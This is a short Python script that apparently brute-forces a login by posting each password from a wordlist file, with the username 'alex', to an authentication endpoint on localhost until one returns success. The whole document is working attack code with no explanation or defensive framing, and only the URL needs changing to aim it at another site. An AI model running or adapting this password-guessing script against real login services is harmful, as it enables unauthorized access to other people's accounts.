import requests

with open('pass.txt') as f:
    passwords = f.read().split('\n')


for password in passwords:
    print(password)
    response = requests.post('http://127.0.0.1:3000/auth',
                             json={'login': 'alex', 'password': password})
    if response.status_code == 200:
        print('Success!')
        break
